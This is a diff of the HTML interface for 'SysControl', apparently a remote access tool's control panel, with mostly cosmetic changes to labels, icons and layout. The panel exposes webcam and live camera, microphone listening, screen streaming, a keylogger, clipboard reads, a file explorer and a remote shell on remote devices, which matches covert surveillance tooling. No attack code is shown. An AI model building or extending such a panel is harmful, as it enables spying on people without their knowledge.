@@ -4,12 +4,15 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>SysControl</title>
+  <meta name="description" content="Remote System Terminal — Monitor and control devices">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
   <link rel="manifest" href="manifest.json">
   <meta name="theme-color" content="#000000">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
 </head>
 <body>
 
@@ -20,20 +23,18 @@
         <h1 class="logo">SysControl</h1>
         <p class="tagline">> remote system terminal</p>
       </div>
-      <div class="auth-form">
+      <form class="auth-form" onsubmit="event.preventDefault(); doAuth()">
         <div class="field">
-          <label>Username</label>
-          <input type="text" id="authUser" placeholder="> enter username"
-                 onkeydown="if(event.key==='Enter')document.getElementById('authPass').focus()" autocomplete="username">
+          <label for="authUser">Username</label>
+          <input type="text" id="authUser" placeholder="> enter username" autocomplete="username">
         </div>
         <div class="field">
-          <label>Password</label>
-          <input type="password" id="authPass" placeholder="> enter password"
-                 onkeydown="if(event.key==='Enter')doAuth()" autocomplete="current-password">
+          <label for="authPass">Password</label>
+          <input type="password" id="authPass" placeholder="> enter password" autocomplete="current-password">
         </div>
         <div id="authError" class="error-text"></div>
-        <button class="btn-pri auth-btn" id="authBtn" onclick="doAuth()">Authenticate</button>
-      </div>
+        <button type="submit" class="btn-pri auth-btn" id="authBtn">Authenticate</button>
+      </form>
     </div>
   </div>
 
@@ -63,7 +64,7 @@
         <p class="status-line" id="loginStatus"></p>
       </div>
       <div class="field">
-        <label>Password</label>
+        <label for="loginPassword">Password</label>
         <input type="password" id="loginPassword" placeholder="> device password"
                onkeydown="if(event.key==='Enter')doLogin()" autocomplete="off">
       </div>
@@ -78,11 +79,11 @@
   <!-- ===== CONTROL PANEL ===== -->
   <div id="panelScreen" class="screen hidden">
     <div class="panel-header">
-      <button class="back-btn" onclick="disconnect()">&larr;</button>
+      <button class="back-btn" onclick="disconnect()" title="Disconnect">&larr;</button>
       <div class="panel-info">
         <h2 id="panelName">Device</h2>
-        <span class="status-dot online"></span>
         <span class="status-label" id="panelStatus">Connected</span>
+        <span class="status-dot" id="panelDot"></span>
       </div>
       <span class="version-tag" id="panelVersion">v1.0.0</span>
     </div>
@@ -90,27 +91,47 @@
     <div class="chat-area" id="chatArea"></div>
 
     <div class="cmd-grid" id="cmdGrid">
-      <button class="cmd" onclick="execCmd('/screen')"><span class="ci">/scr</span>Screen</button>
-      <button class="cmd" onclick="openLiveScreen()"><span class="ci">/str</span>Live</button>
-      <button class="cmd" onclick="execCmd('/webcam')"><span class="ci">/cam</span>Webcam</button>
-      <button class="cmd" onclick="openLiveCam()"><span class="ci">/rec</span>Cam</button>
-      <button class="cmd" onclick="promptSpeech()"><span class="ci">/tts</span>Speech</button>
-      <button class="cmd" onclick="openLiveMic()"><span class="ci">/mic</span>Mic</button>
-      <button class="cmd" onclick="openExplorer()"><span class="ci">/dir</span>Files</button>
-      <button class="cmd" onclick="enterShell()"><span class="ci">&gt;_</span>Shell</button>
-      <button class="cmd" onclick="execCmd('/ip')"><span class="ci">/net</span>IP</button>
-      <button class="cmd" onclick="execCmd('/sys')"><span class="ci">/sys</span>System</button>
-      <button class="cmd" onclick="execCmd('/clipboard')"><span class="ci">/clp</span>Clip</button>
-      <button class="cmd" onclick="openKeylog()"><span class="ci">/key</span>KeyLog</button>
-      <button class="cmd" onclick="execCmd('/wifi')"><span class="ci">/wfi</span>WiFi</button>
-      <button class="cmd" onclick="checkUpdate()"><span class="ci">/upd</span>Update</button>
-      <button class="cmd" onclick="execCmd('/lock')"><span class="ci">/lck</span>Lock</button>
-      <button class="cmd danger" onclick="confirmShutdown()"><span class="ci">/pwr</span>Power</button>
-    </div>
-
+        <div class="cmd-group">
+          <div class="cmd-group-label">Display</div>
+          <div class="cmd-group-btns">
+            <button class="cmd" onclick="execCmd('/screen')"><span class="ci">&#9634;</span>Screen</button>
+            <button class="cmd" onclick="openLiveScreen()"><span class="ci">&#9673;</span>Stream</button>
+            <button class="cmd" onclick="execCmd('/webcam')"><span class="ci">&#9678;</span>Webcam</button>
+            <button class="cmd" onclick="openLiveCam()"><span class="ci">&#9711;</span>Camera</button>
+          </div>
+        </div>
+        <div class="cmd-group">
+          <div class="cmd-group-label">Audio &amp; I/O</div>
+          <div class="cmd-group-btns">
+            <button class="cmd" onclick="promptSpeech()"><span class="ci">&#9836;</span>Speech</button>
+            <button class="cmd" onclick="openLiveMic()"><span class="ci">&#9688;</span>Mic</button>
+            <button class="cmd" onclick="openExplorer()"><span class="ci">&#8862;</span>Files</button>
+            <button class="cmd" onclick="enterShell()"><span class="ci">&gt;_</span>Shell</button>
+          </div>
+        </div>
+        <div class="cmd-group">
+          <div class="cmd-group-label">Info</div>
+          <div class="cmd-group-btns">
+            <button class="cmd" onclick="execCmd('/ip')"><span class="ci">&#8853;</span>IP</button>
+            <button class="cmd" onclick="execCmd('/sys')"><span class="ci">&#9776;</span>System</button>
+            <button class="cmd" onclick="execCmd('/clipboard')"><span class="ci">&#8801;</span>Clip</button>
+            <button class="cmd" onclick="openKeylog()"><span class="ci">&#9000;</span>Keys</button>
+          </div>
+        </div>
+        <div class="cmd-group">
+          <div class="cmd-group-label">Control</div>
+          <div class="cmd-group-btns">
+            <button class="cmd" onclick="execCmd('/wifi')"><span class="ci">&#8776;</span>WiFi</button>
+            <button class="cmd" onclick="checkUpdate()"><span class="ci">&#8635;</span>Update</button>
+            <button class="cmd" onclick="execCmd('/lock')"><span class="ci">&#8859;</span>Lock</button>
+            <button class="cmd danger" onclick="confirmShutdown()"><span class="ci">&#9211;</span>Power</button>
+          </div>
+        </div>
+      </div>
   </div>
 
   <!-- ===== SHELL TERMINAL ===== -->
+
   <div id="shellOverlay" class="overlay hidden">
     <div class="overlay-header">
       <div>
@@ -118,13 +139,13 @@
         <div class="sh-cwd" id="shCwd">~</div>
       </div>
       <button class="sm-btn" onclick="clearShell()">Clear</button>
-      <button class="close-btn" onclick="closeShell()">x</button>
+      <button class="close-btn" onclick="closeShell()">&#10005;</button>
     </div>
     <div class="shell-output" id="shOutput"></div>
     <div class="shell-bar">
       <span class="sh-ps1" id="shPs1">&gt;</span>
-      <input type="text" class="sh-input" id="shInput" placeholder="> command..."
-             onkeydown="shellKey(event)">
+      <input type="text" class="sh-input" id="shInput" placeholder="command..."
+             onkeydown="shellKey(event)" autocomplete="off">
       <button class="sh-send" onclick="runShell()">&gt;</button>
     </div>
   </div>
@@ -137,17 +158,17 @@
         <div class="overlay-title" id="exTitle">Files</div>
         <div class="ex-path" id="exPath">-</div>
       </div>
-      <button class="close-btn" onclick="closeExplorer()">x</button>
+      <button class="close-btn" onclick="closeExplorer()">&#10005;</button>
     </div>
     <div class="drive-bar" id="exDrives"></div>
     <div class="ex-search-row">
-      <input type="text" id="exSearch" class="ex-search" placeholder="> filter..." oninput="filterExplorer()">
+      <input type="text" id="exSearch" class="ex-search" placeholder="filter files..." oninput="filterExplorer()" autocomplete="off">
     </div>
     <div class="ex-list" id="exList"></div>
     <div class="ex-toolbar">
-      <button class="ex-tb" onclick="uploadToExplorer()">upload</button>
-      <button class="ex-tb" onclick="createFolder()">mkdir</button>
-      <button class="ex-tb" onclick="createFile()">touch</button>
+      <button class="ex-tb" onclick="uploadToExplorer()">Upload</button>
+      <button class="ex-tb" onclick="createFolder()">Mkdir</button>
+      <button class="ex-tb" onclick="createFile()">New File</button>
     </div>
     <input type="file" id="exFileInput" style="display:none" onchange="handleUpload(this)" multiple>
   </div>
@@ -160,9 +181,9 @@
         <div class="overlay-title" id="edTitle">Editor</div>
         <div class="ex-path" id="edPath">-</div>
       </div>
-      <span class="dirty-dot hidden" id="edDirty">*</span>
+      <span class="dirty-dot hidden" id="edDirty">&#9679;</span>
       <button class="sm-btn" onclick="saveEditor()" id="edSaveBtn">Save</button>
-      <button class="close-btn" onclick="closeEditor()">x</button>
+      <button class="close-btn" onclick="closeEditor()">&#10005;</button>
     </div>
     <div class="ed-status" id="edStatus"></div>
     <textarea id="edContent" class="ed-textarea" spellcheck="false"
@@ -179,9 +200,9 @@
         <button class="qb active" data-q="med" onclick="setLiveQ('med')">M</button>
         <button class="qb" data-q="high" onclick="setLiveQ('high')">H</button>
       </div>
-      <button class="close-btn" onclick="closeLive()">x</button>
+      <button class="close-btn" onclick="closeLive()">&#10005;</button>
     </div>
-    <div class="live-body"><img id="liveImg" class="live-img" alt="Live"></div>
+    <div class="live-body"><img id="liveImg" class="live-img" alt="Live Screen"></div>
   </div>
 
   <!-- ===== LIVE CAM ===== -->
@@ -194,7 +215,7 @@
         <button class="qb cam-qb active" data-cq="med" onclick="setCamQ('med')">M</button>
         <button class="qb cam-qb" data-cq="high" onclick="setCamQ('high')">H</button>
       </div>
-      <button class="close-btn" onclick="closeLiveCam()">x</button>
+      <button class="close-btn" onclick="closeLiveCam()">&#10005;</button>
     </div>
     <div class="live-body"><img id="camImg" class="live-img" alt="Camera"></div>
   </div>
@@ -204,11 +225,11 @@
     <div class="overlay-header">
       <div class="overlay-title">Microphone</div>
       <div class="live-meta" id="micMeta">Idle</div>
-      <button class="close-btn" onclick="closeMic()">x</button>
+      <button class="close-btn" onclick="closeMic()">&#10005;</button>
     </div>
     <div class="mic-body">
-      <div class="mic-icon" id="micIcon">[MIC]</div>
-      <p id="micStatus">Press Start to listen.</p>
+      <div class="mic-icon" id="micIcon">&#9673;</div>
+      <p id="micStatus">Press Start to listen</p>
       <div class="mic-actions">
         <button class="btn-pri" id="micStartBtn" onclick="startMic()">Start</button>
         <button class="btn-danger hidden" id="micStopBtn" onclick="stopMic()">Stop</button>
@@ -221,7 +242,7 @@
     <div class="overlay-header">
       <div class="overlay-title">Keystrokes</div>
       <div class="live-meta" id="klMeta">Idle</div>
-      <button class="close-btn" onclick="closeKeylog()">x</button>
+      <button class="close-btn" onclick="closeKeylog()">&#10005;</button>
     </div>
     <div class="kl-actions">
       <button class="sm-btn" id="klStartBtn" onclick="startKeylog()">Start</button>
@@ -253,6 +274,9 @@
   <div id="lightbox" class="lightbox hidden" onclick="closeLightbox()">
     <img id="lbImg" src="" alt="Preview">
   </div>
+
+  <!-- ===== TOAST CONTAINER ===== -->
+  <div id="toasts" class="toast-container"></div>
 
   <script src="main.js"></script>
 </body>
